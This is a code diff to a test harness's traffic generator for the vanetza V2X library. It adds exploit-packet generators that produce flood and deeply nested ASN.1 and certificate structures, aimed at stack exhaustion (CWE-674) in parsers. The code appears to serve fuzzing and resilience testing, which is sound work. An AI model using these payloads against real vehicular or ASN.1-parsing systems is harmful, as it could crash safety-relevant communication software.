@@ -1,9 +1,32 @@
+/**
+ * @file traffic_generator.cpp
+ * @brief Implementation of normal traffic generators and fuzzed exploit generators.
+ * 
+ * DESIGN CONTEXT & FUZZING STRATEGIES:
+ * This module generates standards-compliant network payloads and constructs fuzzed 
+ * exploit packet variants. It replicates CWE-674 vulnerabilities by appending flat, 
+ * large integer, sequence-of-integer, or deeply nested ASN.1 structured headers onto 
+ * base reference frames.
+ */
+
 #include "qos_harness/traffic_generator.hpp"
 #include <cstdlib>
 #include <algorithm>
+#include <vanetza/common/byte_buffer_sink.hpp>
+#include <vanetza/common/serialization_buffer.hpp>
+#include <vanetza/security/v2/certificate.hpp>
+#include <vanetza/security/v2/signer_info.hpp>
+#include <boost/iostreams/stream.hpp>
 
 namespace qos_harness {
 
+/**
+ * @brief Mutates a base POC exploit packet by appending randomized flood bytes.
+ * 
+ * @param poc_packet Reference base ASN.1 exploit packet.
+ * @param seed Random seed for deterministic replication.
+ * @return vanetza::ByteBuffer representing the mutated exploit packet.
+ */
 vanetza::ByteBuffer TrafficGenerator::craftAttackPacket(const vanetza::ByteBuffer& poc_packet, unsigned int seed) {
     vanetza::ByteBuffer attack = poc_packet;
     srand(seed);
@@ -13,13 +36,14 @@ vanetza::ByteBuffer TrafficGenerator::craftAttackPacket(const vanetza::ByteBuffe
     const uint8_t flood_candidates[] = {0x02, 0x01, 0x03, 0x04};
     uint8_t flood_byte = flood_candidates[rand() % 4];
 
-    int variation = (rand() % 41) - 20; // -20 to +20
+    int variation = (rand() % 41) - 20; // -20 to +20 byte size variation
     size_t flood_end = attack.size() + variation;
 
     if (flood_end > attack.size()) {
         attack.resize(flood_end, flood_byte);
     }
 
+    // Overwrite the payload suffix starting at byte offset 64 with the selected flood byte
     for (size_t i = 64; i < std::min(flood_end, attack.size()); ++i) {
         attack[i] = flood_byte;
     }
@@ -27,27 +51,34 @@ vanetza::ByteBuffer TrafficGenerator::craftAttackPacket(const vanetza::ByteBuffe
     return attack;
 }
 
+// Flat byte array flood strategies
 vanetza::ByteBuffer TrafficGenerator::floodFlat02(size_t n) { return vanetza::ByteBuffer(n, 0x02); }
 vanetza::ByteBuffer TrafficGenerator::floodFlat03(size_t n) { return vanetza::ByteBuffer(n, 0x03); }
 vanetza::ByteBuffer TrafficGenerator::floodFlat04(size_t n) { return vanetza::ByteBuffer(n, 0x04); }
 
+/**
+ * @brief Generates a buffer packed with valid ASN.1 INTEGER triples (0x02, 0x01, 0x00).
+ */
 vanetza::ByteBuffer TrafficGenerator::floodValidIntegers(size_t n) {
     vanetza::ByteBuffer buf(n, 0x00);
     for (size_t i = 0; i + 2 < n; i += 3) {
-        buf[i]   = 0x02;
-        buf[i+1] = 0x01;
-        buf[i+2] = 0x00;
+        buf[i]   = 0x02; // Type Tag: INTEGER
+        buf[i+1] = 0x01; // Length: 1 byte
+        buf[i+2] = 0x00; // Value: 0x00
     }
     return buf;
 }
 
+/**
+ * @brief Generates a buffer packed with large ASN.1 INTEGER structures (0x02, 0x82, length_high, length_low).
+ */
 vanetza::ByteBuffer TrafficGenerator::floodLargeIntegers(size_t n) {
     vanetza::ByteBuffer buf(n, 0x02);
     size_t i = 0;
     while (i + 4 <= n) {
         size_t content = std::min(n - i - 4, static_cast<size_t>(0x3FF));
-        buf[i]   = 0x02;
-        buf[i+1] = 0x82;
+        buf[i]   = 0x02; // Type Tag: INTEGER
+        buf[i+1] = 0x82; // Length: Multi-byte indicator (2 bytes following)
         buf[i+2] = static_cast<uint8_t>((content >> 8) & 0xFF);
         buf[i+3] = static_cast<uint8_t>( content       & 0xFF);
         i += 4 + content;
@@ -55,45 +86,155 @@ vanetza::ByteBuffer TrafficGenerator::floodLargeIntegers(size_t n) {
     return buf;
 }
 
+/**
+ * @brief Generates a valid SEQUENCE containing nested INTEGER triples.
+ */
 vanetza::ByteBuffer TrafficGenerator::floodSequenceOfIntegers(size_t n) {
     vanetza::ByteBuffer buf(n, 0x00);
     if (n < 4) return buf;
     size_t content_len = n - 4;
-    buf[0] = 0x30;
-    buf[1] = 0x82;
+    buf[0] = 0x30; // Type Tag: SEQUENCE
+    buf[1] = 0x82; // Length: Multi-byte indicator (2 bytes following)
     buf[2] = static_cast<uint8_t>((content_len >> 8) & 0xFF);
     buf[3] = static_cast<uint8_t>( content_len       & 0xFF);
     for (size_t i = 4; i + 2 < n; i += 3) {
-        buf[i]   = 0x02;
-        buf[i+1] = 0x01;
-        buf[i+2] = 0x00;
+        buf[i]   = 0x02; // Nested Type Tag: INTEGER
+        buf[i+1] = 0x01; // Nested Length: 1 byte
+        buf[i+2] = 0x00; // Nested Value: 0x00
     }
     return buf;
 }
 
+/**
+ * @brief Generates recursive deep-nested SEQUENCE headers (0x30, 0x82, length_high, length_low)
+ *        to trigger parsing structural stack exhaustion.
+ */
 vanetza::ByteBuffer TrafficGenerator::floodDeepNested(size_t n) {
     vanetza::ByteBuffer buf(n, 0x00);
     size_t offset = 0;
     while (offset + 4 <= n) {
         size_t remaining = n - offset - 4;
-        buf[offset]   = 0x30;
-        buf[offset+1] = 0x82;
+        buf[offset]   = 0x30; // Type Tag: SEQUENCE
+        buf[offset+1] = 0x82; // Length: Multi-byte indicator
         buf[offset+2] = static_cast<uint8_t>((remaining >> 8) & 0xFF);
         buf[offset+3] = static_cast<uint8_t>( remaining       & 0xFF);
         offset += 4;
     }
     return buf;
 }
+int TrafficGenerator::s_last_depth = 0;
 
+int TrafficGenerator::getLastGeneratedDepth() {
+    return s_last_depth;
+}
+
+namespace {
+
+vanetza::security::v2::Certificate createNestedCert(int depth, size_t padding_size) {
+    using namespace vanetza::security::v2;
+    Certificate cert;
+    cert.subject_info.subject_type = SubjectType::Authorization_Authority;
+
+    if (depth > 0) {
+        cert.signer_info = createNestedCert(depth - 1, padding_size);
+    } else {
+        cert.signer_info = nullptr;
+    }
+
+    vanetza::security::EcdsaSignature sig;
+    vanetza::security::X_Coordinate_Only x_coord;
+    x_coord.x.assign(32, 0x02);
+    sig.R = x_coord;
+    sig.s.assign(32, 0x02);
+    cert.signature = sig;
+
+    if (depth == 0 && padding_size > 0) {
+        vanetza::ByteBuffer dummy_ssp(padding_size, 0x02);
+        cert.add_permission(36, dummy_ssp);
+    }
+
+    return cert;
+}
+
+vanetza::ByteBuffer serializeSignerInfo(const vanetza::security::v2::SignerInfo& info) {
+    using namespace vanetza;
+    ByteBuffer buf;
+    byte_buffer_sink sink(buf);
+    boost::iostreams::stream_buffer<byte_buffer_sink> stream(sink);
+    OutputArchive ar(stream);
+    vanetza::security::v2::serialize(ar, info);
+    stream.close();
+    return buf;
+}
+
+} // namespace
+
+vanetza::ByteBuffer TrafficGenerator::floodStructuralNested(size_t n) {
+    using namespace vanetza::security::v2;
+    if (n == 0) return {};
+
+    // Base size for 1 layer of nested certificate without padding is around 70 bytes.
+    if (n < 70) {
+        s_last_depth = 1;
+        return vanetza::ByteBuffer(n, 0x02);
+    }
+
+    int best_depth = 0;
+    for (int d = 1; d <= 50; ++d) {
+        Certificate cert = createNestedCert(d, 0);
+        SignerInfo s_info = cert;
+        vanetza::ByteBuffer test_buf = serializeSignerInfo(s_info);
+        if (test_buf.size() <= n) {
+            best_depth = d;
+        } else {
+            break;
+        }
+    }
+
+    if (best_depth == 0) {
+        s_last_depth = 1;
+        return vanetza::ByteBuffer(n, 0x02);
+    }
+
+    s_last_depth = best_depth;
+
+    Certificate base_cert = createNestedCert(best_depth, 0);
+    size_t base_size = serializeSignerInfo(base_cert).size();
+    size_t padding_guess = (n > base_size) ? n - base_size : 0;
+
+    for (int trial = 0; trial < 100; ++trial) {
+        Certificate cert = createNestedCert(best_depth, padding_guess);
+        vanetza::ByteBuffer buf = serializeSignerInfo(cert);
+        if (buf.size() == n) {
+            return buf;
+        } else if (buf.size() > n) {
+            if (padding_guess > 0) {
+                padding_guess--;
+            } else {
+                break;
+            }
+        } else {
+            padding_guess++;
+        }
+    }
+
+    vanetza::ByteBuffer fallback_buf(n, 0x02);
+    return fallback_buf;
+}
+
+/**
+ * @brief Factory class loading available flood strategies.
+ */
 std::vector<std::pair<std::string, FloodStrategy>> TrafficGenerator::makeStrategies() {
     return {
-        { "flat-0x02 (INTEGER tags)",          floodFlat02            },
-        { "flat-0x03 (BIT STRING tags)",       floodFlat03            },
-        { "flat-0x04 (OCTET STRING tags)",     floodFlat04            },
-        { "valid INTEGER triples 02 01 00",    floodValidIntegers     },
-        { "large INTEGER 02 82 xx xx",         floodLargeIntegers     },
-        { "SEQUENCE of INTEGER triples",       floodSequenceOfIntegers},
-        { "deep nested SEQUENCE headers",      floodDeepNested        },
+        { "flat-0x02 (INTEGER tags)",                         floodFlat02            },
+        { "flat-0x03 (BIT STRING tags)",                      floodFlat03            },
+        { "flat-0x04 (OCTET STRING tags)",                    floodFlat04            },
+        { "valid INTEGER triples 02 01 00",                   floodValidIntegers     },
+        { "large INTEGER 02 82 xx xx",                        floodLargeIntegers     },
+        { "SEQUENCE of INTEGER triples",                      floodSequenceOfIntegers},
+        { "deep nested SEQUENCE headers",                     floodDeepNested        },
+        { "structural nested Certificate (C++ serialized)",   floodStructuralNested  },
     };
 }
 
